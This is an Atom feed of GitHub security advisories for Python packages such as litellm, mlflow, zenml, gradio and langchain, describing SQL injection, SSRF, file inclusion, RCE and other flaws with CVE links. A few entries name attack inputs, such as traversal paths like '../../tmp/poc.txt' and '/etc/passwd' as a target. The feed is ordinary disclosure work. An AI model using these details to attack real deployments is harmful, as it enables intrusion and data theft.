<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2024-06-07T12:01:29.770Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[h2o] Arbitrary system path lookup in h20]]></title>
        <id>https://github.com/advisories/GHSA-x234-r5fg-x52m</id>
        <link href="https://github.com/advisories/GHSA-x234-r5fg-x52m"/>
        <updated>2024-06-06T22:57:23.000Z</updated>
        <content type="html"><![CDATA[<p>In h2oai/h2o-3 version 3.40.0.4, an exposure of sensitive information vulnerability exists due to an arbitrary system path lookup feature. This vulnerability allows any remote user to view full paths in the entire file system where h2o-3 is hosted. Specifically, the issue resides in the Typeahead API call, which when requested with a typeahead lookup of '/', exposes the root filesystem including directories such as /home, /usr, /bin, among others. This vulnerability could allow attackers to explore the entire filesystem, and when combined with a Local File Inclusion (LFI) vulnerability, could make exploitation of the server trivial.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5550">https://nvd.nist.gov/vuln/detail/CVE-2024-5550</a></li>
<li><a href="https://huntr.com/bounties/e76372c2-39be-4984-a7c8-7048a75a25dc">https://huntr.com/bounties/e76372c2-39be-4984-a7c8-7048a75a25dc</a></li>
<li><a href="https://github.com/advisories/GHSA-x234-r5fg-x52m">https://github.com/advisories/GHSA-x234-r5fg-x52m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x234-r5fg-x52m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] Arbitrary file deletion in litellm]]></title>
        <id>https://github.com/advisories/GHSA-3xr8-qfvj-9p9j</id>
        <link href="https://github.com/advisories/GHSA-3xr8-qfvj-9p9j"/>
        <updated>2024-06-06T22:55:47.000Z</updated>
        <content type="html"><![CDATA[<p>BerriAI's litellm, in its latest version, is vulnerable to arbitrary file deletion due to improper input validation on the <code>/audio/transcriptions</code> endpoint. An attacker can exploit this vulnerability by sending a specially crafted request that includes a file path to the server, which then deletes the specified file without proper authorization or validation. This vulnerability is present in the code where <code>os.remove(file.filename)</code> is used to delete a file, allowing any user to delete critical files on the server such as SSH keys, SQLite databases, or configuration files. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4888">https://nvd.nist.gov/vuln/detail/CVE-2024-4888</a></li>
<li><a href="https://huntr.com/bounties/48461d89-cf13-4ad3-a43e-0d37da08fc6c">https://huntr.com/bounties/48461d89-cf13-4ad3-a43e-0d37da08fc6c</a></li>
<li><a href="https://github.com/BerriAI/litellm/pull/3193">https://github.com/BerriAI/litellm/pull/3193</a></li>
<li><a href="https://github.com/advisories/GHSA-3xr8-qfvj-9p9j">https://github.com/advisories/GHSA-3xr8-qfvj-9p9j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3xr8-qfvj-9p9j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] SQL injection in litellm]]></title>
        <id>https://github.com/advisories/GHSA-h6m6-jj8v-94jj</id>
        <link href="https://github.com/advisories/GHSA-h6m6-jj8v-94jj"/>
        <updated>2024-06-06T22:54:22.000Z</updated>
        <content type="html"><![CDATA[<p>An SQL Injection vulnerability exists in the berriai/litellm repository, specifically within the <code>/global/spend/logs</code> endpoint. The vulnerability arises due to improper neutralization of special elements used in an SQL command. The affected code constructs an SQL query by concatenating an unvalidated <code>api_key</code> parameter directly into the query, making it susceptible to SQL Injection if the <code>api_key</code> contains malicious data. This issue affects the latest version of the repository. Successful exploitation of this vulnerability could lead to unauthorized access, data manipulation, exposure of confidential information, and denial of service (DoS).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5225">https://nvd.nist.gov/vuln/detail/CVE-2024-5225</a></li>
<li><a href="https://huntr.com/bounties/491e4884-0306-4cd4-8fe2-9a19de33bf5c">https://huntr.com/bounties/491e4884-0306-4cd4-8fe2-9a19de33bf5c</a></li>
<li><a href="https://github.com/BerriAI/litellm/pull/3940">https://github.com/BerriAI/litellm/pull/3940</a></li>
<li><a href="https://github.com/BerriAI/litellm/commit/f75c15d6cd535aa78014378ad532de1df6be2f56">https://github.com/BerriAI/litellm/commit/f75c15d6cd535aa78014378ad532de1df6be2f56</a></li>
<li><a href="https://github.com/advisories/GHSA-h6m6-jj8v-94jj">https://github.com/advisories/GHSA-h6m6-jj8v-94jj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h6m6-jj8v-94jj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] SQL injection in litellm]]></title>
        <id>https://github.com/advisories/GHSA-8j42-pcfm-3467</id>
        <link href="https://github.com/advisories/GHSA-8j42-pcfm-3467"/>
        <updated>2024-06-06T22:53:19.000Z</updated>
        <content type="html"><![CDATA[<p>A blind SQL injection vulnerability exists in the berriai/litellm application, specifically within the '/team/update' process. The vulnerability arises due to the improper handling of the 'user_id' parameter in the raw SQL query used for deleting users. An attacker can exploit this vulnerability by injecting malicious SQL commands through the 'user_id' parameter, leading to potential unauthorized access to sensitive information such as API keys, user information, and tokens stored in the database. The affected version is 1.27.14.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4890">https://nvd.nist.gov/vuln/detail/CVE-2024-4890</a></li>
<li><a href="https://huntr.com/bounties/a4f6d357-5b44-4e00-9cac-f1cc351211d2">https://huntr.com/bounties/a4f6d357-5b44-4e00-9cac-f1cc351211d2</a></li>
<li><a href="https://github.com/BerriAI/litellm/pull/2954">https://github.com/BerriAI/litellm/pull/2954</a></li>
<li><a href="https://github.com/advisories/GHSA-8j42-pcfm-3467">https://github.com/advisories/GHSA-8j42-pcfm-3467</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8j42-pcfm-3467</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dtale] Authentication bypass in dtale]]></title>
        <id>https://github.com/advisories/GHSA-v9q6-fm48-rx74</id>
        <link href="https://github.com/advisories/GHSA-v9q6-fm48-rx74"/>
        <updated>2024-06-06T22:47:25.000Z</updated>
        <content type="html"><![CDATA[<p>man-group/dtale version 3.10.0 is vulnerable to an authentication bypass and remote code execution (RCE) due to improper input validation. The vulnerability arises from a hardcoded <code>SECRET_KEY</code> in the flask configuration, allowing attackers to forge a session cookie if authentication is enabled. Additionally, the application fails to properly restrict custom filter queries, enabling attackers to execute arbitrary code on the server by bypassing the restriction on the <code>/update-settings</code> endpoint, even when <code>enable_custom_filters</code> is not enabled. This vulnerability allows attackers to bypass authentication mechanisms and execute remote code on the server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3408">https://nvd.nist.gov/vuln/detail/CVE-2024-3408</a></li>
<li><a href="https://huntr.com/bounties/57a06666-ff85-4577-af19-f3dfb7b02f91">https://huntr.com/bounties/57a06666-ff85-4577-af19-f3dfb7b02f91</a></li>
<li><a href="https://github.com/advisories/GHSA-v9q6-fm48-rx74">https://github.com/advisories/GHSA-v9q6-fm48-rx74</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v9q6-fm48-rx74</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-06-06T21:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain] Server-Side Request Forgery in langchain]]></title>
        <id>https://github.com/advisories/GHSA-q25c-c977-4cmh</id>
        <link href="https://github.com/advisories/GHSA-q25c-c977-4cmh"/>
        <updated>2024-06-06T22:41:07.000Z</updated>
        <content type="html"><![CDATA[<p>A Server-Side Request Forgery (SSRF) vulnerability exists in the Web Research Retriever component of langchain-ai/langchain version 0.1.5. The vulnerability arises because the Web Research Retriever does not restrict requests to remote internet addresses, allowing it to reach local addresses. This flaw enables attackers to execute port scans, access local services, and in some scenarios, read instance metadata from cloud environments. The vulnerability is particularly concerning as it can be exploited to abuse the Web Explorer server as a proxy for web attacks on third parties and interact with servers in the local network, including reading their response data. This could potentially lead to arbitrary code execution, depending on the nature of the local services. The vulnerability is limited to GET requests, as POST requests are not possible, but the impact on confidentiality, integrity, and availability is significant due to the potential for stolen credentials and state-changing interactions with internal APIs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3095">https://nvd.nist.gov/vuln/detail/CVE-2024-3095</a></li>
<li><a href="https://huntr.com/bounties/e62d4895-2901-405b-9559-38276b6a5273">https://huntr.com/bounties/e62d4895-2901-405b-9559-38276b6a5273</a></li>
<li><a href="https://github.com/advisories/GHSA-q25c-c977-4cmh">https://github.com/advisories/GHSA-q25c-c977-4cmh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q25c-c977-4cmh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] Undefined Behavior in mlflow]]></title>
        <id>https://github.com/advisories/GHSA-8f8q-q2j7-7j2m</id>
        <link href="https://github.com/advisories/GHSA-8f8q-q2j7-7j2m"/>
        <updated>2024-06-06T22:38:43.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability in mlflow/mlflow version 2.11.1 allows attackers to create multiple models with the same name by exploiting URL encoding. This flaw can lead to Denial of Service (DoS) as an authenticated user might not be able to use the intended model, as it will open a different model each time. Additionally, an attacker can exploit this vulnerability to perform data model poisoning by creating a model with the same name, potentially causing an authenticated user to become a victim by using the poisoned model. The issue stems from inadequate validation of model names, allowing for the creation of models with URL-encoded names that are treated as distinct from their URL-decoded counterparts.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3099">https://nvd.nist.gov/vuln/detail/CVE-2024-3099</a></li>
<li><a href="https://huntr.com/bounties/8d96374a-ce8d-480e-9cb0-0a7e5165c24a">https://huntr.com/bounties/8d96374a-ce8d-480e-9cb0-0a7e5165c24a</a></li>
<li><a href="https://github.com/advisories/GHSA-8f8q-q2j7-7j2m">https://github.com/advisories/GHSA-8f8q-q2j7-7j2m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8f8q-q2j7-7j2m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] Local File Inclusion in mlflow]]></title>
        <id>https://github.com/advisories/GHSA-j46q-5pxx-8vmw</id>
        <link href="https://github.com/advisories/GHSA-j46q-5pxx-8vmw"/>
        <updated>2024-06-06T22:37:39.000Z</updated>
        <content type="html"><![CDATA[<p>A Local File Inclusion (LFI) vulnerability was identified in mlflow/mlflow, specifically in version 2.9.2, which was fixed in version 2.11.3. This vulnerability arises from the application's failure to properly validate URI fragments for directory traversal sequences such as '../'. An attacker can exploit this flaw by manipulating the fragment part of the URI to read arbitrary files on the local file system, including sensitive files like '/etc/passwd'. The vulnerability is a bypass to a previous patch that only addressed similar manipulation within the URI's query string, highlighting the need for comprehensive validation of all parts of a URI to prevent LFI attacks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2928">https://nvd.nist.gov/vuln/detail/CVE-2024-2928</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/96f0b573a73d8eedd6735a2ce26e08859527be07">https://github.com/mlflow/mlflow/commit/96f0b573a73d8eedd6735a2ce26e08859527be07</a></li>
<li><a href="https://huntr.com/bounties/19bf02d7-6393-4a95-b9d0-d6d4d2d8c298">https://huntr.com/bounties/19bf02d7-6393-4a95-b9d0-d6d4d2d8c298</a></li>
<li><a href="https://github.com/advisories/GHSA-j46q-5pxx-8vmw">https://github.com/advisories/GHSA-j46q-5pxx-8vmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j46q-5pxx-8vmw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-06T21:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zenml] Clickjacking in zenml]]></title>
        <id>https://github.com/advisories/GHSA-mq73-g4qr-fgcq</id>
        <link href="https://github.com/advisories/GHSA-mq73-g4qr-fgcq"/>
        <updated>2024-06-06T22:30:11.000Z</updated>
        <content type="html"><![CDATA[<p>A clickjacking vulnerability exists in zenml-io/zenml versions up to and including 0.55.5 due to the application's failure to set appropriate X-Frame-Options or Content-Security-Policy HTTP headers. This vulnerability allows an attacker to embed the application UI within an iframe on a malicious page, potentially leading to unauthorized actions by tricking users into interacting with the interface under the attacker's control. The issue was addressed in version 0.56.3.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2383">https://nvd.nist.gov/vuln/detail/CVE-2024-2383</a></li>
<li><a href="https://github.com/zenml-io/zenml/commit/f863fde1269bc355951f8cfc826c0244d88ad5e9">https://github.com/zenml-io/zenml/commit/f863fde1269bc355951f8cfc826c0244d88ad5e9</a></li>
<li><a href="https://huntr.com/bounties/22d26f5a-c0ae-4344-aa7d-08ff5ada3963">https://huntr.com/bounties/22d26f5a-c0ae-4344-aa7d-08ff5ada3963</a></li>
<li><a href="https://github.com/advisories/GHSA-mq73-g4qr-fgcq">https://github.com/advisories/GHSA-mq73-g4qr-fgcq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq73-g4qr-fgcq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zenml] Improper authentication in zenml]]></title>
        <id>https://github.com/advisories/GHSA-j527-v579-m98h</id>
        <link href="https://github.com/advisories/GHSA-j527-v579-m98h"/>
        <updated>2024-06-06T22:29:19.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in zenml-io/zenml versions up to and including 0.55.4. Due to improper authentication mechanisms, an attacker with access to an active user session can change the account password without needing to know the current password. This vulnerability allows for unauthorized account takeover by bypassing the standard password change verification process. The issue was fixed in version 0.56.3.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2213">https://nvd.nist.gov/vuln/detail/CVE-2024-2213</a></li>
<li><a href="https://github.com/zenml-io/zenml/commit/58cb3d987372c91eb605853c35325701733337c2">https://github.com/zenml-io/zenml/commit/58cb3d987372c91eb605853c35325701733337c2</a></li>
<li><a href="https://huntr.com/bounties/8f5534ac-fd08-4b8b-8c2e-35949aa36e48">https://huntr.com/bounties/8f5534ac-fd08-4b8b-8c2e-35949aa36e48</a></li>
<li><a href="https://github.com/advisories/GHSA-j527-v579-m98h">https://github.com/advisories/GHSA-j527-v579-m98h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j527-v579-m98h</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-06-06T21:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zenml] Cross site scripting in zenml]]></title>
        <id>https://github.com/advisories/GHSA-vwgf-7f9h-h499</id>
        <link href="https://github.com/advisories/GHSA-vwgf-7f9h-h499"/>
        <updated>2024-06-06T22:28:36.000Z</updated>
        <content type="html"><![CDATA[<p>A stored Cross-Site Scripting (XSS) vulnerability was identified in the zenml-io/zenml repository, specifically within the 'logo_url' field. By injecting malicious payloads into this field, an attacker could send harmful messages to other users, potentially compromising their accounts. The vulnerability affects version 0.55.3 and was fixed in version 0.56.2. The impact of exploiting this vulnerability could lead to user account compromise.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2171">https://nvd.nist.gov/vuln/detail/CVE-2024-2171</a></li>
<li><a href="https://github.com/zenml-io/zenml/commit/68bcb3ba60cba9729c9713a49c39502d40fb945e">https://github.com/zenml-io/zenml/commit/68bcb3ba60cba9729c9713a49c39502d40fb945e</a></li>
<li><a href="https://huntr.com/bounties/cee06a28-7e3b-460b-b504-69add838ebe8">https://huntr.com/bounties/cee06a28-7e3b-460b-b504-69add838ebe8</a></li>
<li><a href="https://github.com/advisories/GHSA-vwgf-7f9h-h499">https://github.com/advisories/GHSA-vwgf-7f9h-h499</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwgf-7f9h-h499</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-06-06T21:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zenml] Race condition in zenml]]></title>
        <id>https://github.com/advisories/GHSA-c546-8jmq-hprj</id>
        <link href="https://github.com/advisories/GHSA-c546-8jmq-hprj"/>
        <updated>2024-06-06T22:22:20.000Z</updated>
        <content type="html"><![CDATA[<p>A race condition vulnerability exists in zenml-io/zenml versions up to and including 0.55.3, which allows for the creation of multiple users with the same username when requests are sent in parallel. This issue was fixed in version 0.55.5. The vulnerability arises due to insufficient handling of concurrent user creation requests, leading to data inconsistencies and potential authentication problems. Specifically, concurrent processes may overwrite or corrupt user data, complicating user identification and posing security risks. This issue is particularly concerning for APIs that rely on usernames as input parameters, such as PUT /api/v1/users/test_race, where it could lead to further complications.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2032">https://nvd.nist.gov/vuln/detail/CVE-2024-2032</a></li>
<li><a href="https://github.com/zenml-io/zenml/commit/afcaf741ef9114c9b32f722f101b97de3d8d147b">https://github.com/zenml-io/zenml/commit/afcaf741ef9114c9b32f722f101b97de3d8d147b</a></li>
<li><a href="https://huntr.com/bounties/6199cd5d-611f-4ea9-96c5-52a952ba5a56">https://huntr.com/bounties/6199cd5d-611f-4ea9-96c5-52a952ba5a56</a></li>
<li><a href="https://github.com/advisories/GHSA-c546-8jmq-hprj">https://github.com/advisories/GHSA-c546-8jmq-hprj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c546-8jmq-hprj</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-06-06T21:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[zenml] Improper authorization in zenml]]></title>
        <id>https://github.com/advisories/GHSA-9x88-4jg8-4vf7</id>
        <link href="https://github.com/advisories/GHSA-9x88-4jg8-4vf7"/>
        <updated>2024-06-06T22:21:22.000Z</updated>
        <content type="html"><![CDATA[<p>An improper authorization vulnerability exists in the zenml-io/zenml repository, specifically within the API PUT /api/v1/users/id endpoint. This vulnerability allows any authenticated user to modify the information of other users, including changing the <code>active</code> status of user accounts to false, effectively deactivating them. This issue affects version 0.55.3 and was fixed in version 0.56.2. The impact of this vulnerability is significant as it allows for the deactivation of admin accounts, potentially disrupting the functionality and security of the application.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2035">https://nvd.nist.gov/vuln/detail/CVE-2024-2035</a></li>
<li><a href="https://github.com/zenml-io/zenml/commit/b95f083efffa56831cd41d8ed536aeb0b6038fa3">https://github.com/zenml-io/zenml/commit/b95f083efffa56831cd41d8ed536aeb0b6038fa3</a></li>
<li><a href="https://huntr.com/bounties/1cfc6493-082e-4229-9f2f-496801a6557c">https://huntr.com/bounties/1cfc6493-082e-4229-9f2f-496801a6557c</a></li>
<li><a href="https://github.com/advisories/GHSA-9x88-4jg8-4vf7">https://github.com/advisories/GHSA-9x88-4jg8-4vf7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9x88-4jg8-4vf7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain] Denial of service in langchain]]></title>
        <id>https://github.com/advisories/GHSA-3hjh-jh2h-vrg6</id>
        <link href="https://github.com/advisories/GHSA-3hjh-jh2h-vrg6"/>
        <updated>2024-06-06T22:21:15.000Z</updated>
        <content type="html"><![CDATA[<p>A Denial-of-Service (DoS) vulnerability exists in the <code>SitemapLoader</code> class of the <code>langchain-ai/langchain</code> repository, affecting all versions. The <code>parse_sitemap</code> method, responsible for parsing sitemaps and extracting URLs, lacks a mechanism to prevent infinite recursion when a sitemap URL refers to the current sitemap itself. This oversight allows for the possibility of an infinite loop, leading to a crash by exceeding the maximum recursion depth in Python. This vulnerability can be exploited to occupy server socket/port resources and crash the Python process, impacting the availability of services relying on this functionality.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2965">https://nvd.nist.gov/vuln/detail/CVE-2024-2965</a></li>
<li><a href="https://huntr.com/bounties/90b0776d-9fa6-4841-aac4-09fde5918cae">https://huntr.com/bounties/90b0776d-9fa6-4841-aac4-09fde5918cae</a></li>
<li><a href="https://github.com/advisories/GHSA-3hjh-jh2h-vrg6">https://github.com/advisories/GHSA-3hjh-jh2h-vrg6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3hjh-jh2h-vrg6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] Remote code execution in mlflow]]></title>
        <id>https://github.com/advisories/GHSA-5q6c-ffvg-xcm9</id>
        <link href="https://github.com/advisories/GHSA-5q6c-ffvg-xcm9"/>
        <updated>2024-06-06T22:15:32.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability in mlflow/mlflow version 8.2.1 allows for remote code execution due to improper neutralization of special elements used in an OS command ('Command Injection') within the <code>mlflow.data.http_dataset_source.py</code> module. Specifically, when loading a dataset from a source URL with an HTTP scheme, the filename extracted from the <code>Content-Disposition</code> header or the URL path is used to generate the final file path without proper sanitization. This flaw enables an attacker to control the file path fully by utilizing path traversal or absolute path techniques, such as '../../tmp/poc.txt' or '/tmp/poc.txt', leading to arbitrary file write. Exploiting this vulnerability could allow a malicious user to execute commands on the vulnerable machine, potentially gaining access to data and model information. The issue is fixed in version 2.9.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-0520">https://nvd.nist.gov/vuln/detail/CVE-2024-0520</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/400c226953b4568f4361bc0a0c223511652c2b9d">https://github.com/mlflow/mlflow/commit/400c226953b4568f4361bc0a0c223511652c2b9d</a></li>
<li><a href="https://huntr.com/bounties/93e470d7-b6f0-409b-af63-49d3e2a26dbc">https://huntr.com/bounties/93e470d7-b6f0-409b-af63-49d3e2a26dbc</a></li>
<li><a href="https://github.com/advisories/GHSA-5q6c-ffvg-xcm9">https://github.com/advisories/GHSA-5q6c-ffvg-xcm9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5q6c-ffvg-xcm9</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-06-06T21:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gradio] Local file inclusion in gradio]]></title>
        <id>https://github.com/advisories/GHSA-6v6g-j5fq-hpvw</id>
        <link href="https://github.com/advisories/GHSA-6v6g-j5fq-hpvw"/>
        <updated>2024-06-06T22:13:49.000Z</updated>
        <content type="html"><![CDATA[<p>A local file inclusion vulnerability exists in the JSON component of gradio-app/gradio and was discovered in version 4.25. The vulnerability arises from improper input validation in the <code>postprocess()</code> function within <code>gradio/components/json_component.py</code>, where a user-controlled string is parsed as JSON. If the parsed JSON object contains a <code>path</code> key, the specified file is moved to a temporary directory, making it possible to retrieve it later via the <code>/file=..</code> endpoint. This issue is due to the <code>processing_utils.move_files_to_cache()</code> function traversing any object passed to it, looking for a dictionary with a <code>path</code> key, and then copying the specified file to a temporary directory. The vulnerability can be exploited by an attacker to read files on the remote system, posing a significant security risk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4941">https://nvd.nist.gov/vuln/detail/CVE-2024-4941</a></li>
<li><a href="https://github.com/gradio-app/gradio/commit/ee1e2942e0a1ae84a08a05464e41c8108a03fa9c">https://github.com/gradio-app/gradio/commit/ee1e2942e0a1ae84a08a05464e41c8108a03fa9c</a></li>
<li><a href="https://huntr.com/bounties/39889ce1-298d-4568-aecd-7ae40c2ca58e">https://huntr.com/bounties/39889ce1-298d-4568-aecd-7ae40c2ca58e</a></li>
<li><a href="https://github.com/advisories/GHSA-6v6g-j5fq-hpvw">https://github.com/advisories/GHSA-6v6g-j5fq-hpvw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6v6g-j5fq-hpvw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-06T18:30:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lightning] Remote code execution in pytorch lightning]]></title>
        <id>https://github.com/advisories/GHSA-cgwc-qvrx-rf7f</id>
        <link href="https://github.com/advisories/GHSA-cgwc-qvrx-rf7f"/>
        <updated>2024-06-06T22:10:58.000Z</updated>
        <content type="html"><![CDATA[<p>A remote code execution (RCE) vulnerability exists in the lightning-ai/pytorch-lightning library version 2.2.1 due to improper handling of deserialized user input and mismanagement of dunder attributes by the <code>deepdiff</code> library. The library uses <code>deepdiff.Delta</code> objects to modify application state based on frontend actions. However, it is possible to bypass the intended restrictions on modifying dunder attributes, allowing an attacker to construct a serialized delta that passes the deserializer whitelist and contains dunder attributes. When processed, this can be exploited to access other modules, classes, and instances, leading to arbitrary attribute write and total RCE on any self-hosted pytorch-lightning application in its default configuration, as the delta endpoint is enabled by default.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5452">https://nvd.nist.gov/vuln/detail/CVE-2024-5452</a></li>
<li><a href="https://huntr.com/bounties/486add92-275e-4a7b-92f9-42d84bc759da">https://huntr.com/bounties/486add92-275e-4a7b-92f9-42d84bc759da</a></li>
<li><a href="https://github.com/advisories/GHSA-cgwc-qvrx-rf7f">https://github.com/advisories/GHSA-cgwc-qvrx-rf7f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cgwc-qvrx-rf7f</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-06-06T18:30:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gradio] Server-Side Request Forgery in gradio]]></title>
        <id>https://github.com/advisories/GHSA-973g-55hp-3frw</id>
        <link href="https://github.com/advisories/GHSA-973g-55hp-3frw"/>
        <updated>2024-06-06T22:06:59.000Z</updated>
        <content type="html"><![CDATA[<p>A Server-Side Request Forgery (SSRF) vulnerability exists in the gradio-app/gradio and was discovered in version 4.21.0, specifically within the <code>/queue/join</code> endpoint and the <code>save_url_to_cache</code> function. The vulnerability arises when the <code>path</code> value, obtained from the user and expected to be a URL, is used to make an HTTP request without sufficient validation checks. This flaw allows an attacker to send crafted requests that could lead to unauthorized access to the local network or the AWS metadata endpoint, thereby compromising the security of internal servers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4325">https://nvd.nist.gov/vuln/detail/CVE-2024-4325</a></li>
<li><a href="https://huntr.com/bounties/b34f084b-7d14-4f00-bc10-048a3a5aaf88">https://huntr.com/bounties/b34f084b-7d14-4f00-bc10-048a3a5aaf88</a></li>
<li><a href="https://github.com/gradio-app/gradio/pull/8301">https://github.com/gradio-app/gradio/pull/8301</a></li>
<li><a href="https://github.com/advisories/GHSA-973g-55hp-3frw">https://github.com/advisories/GHSA-973g-55hp-3frw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
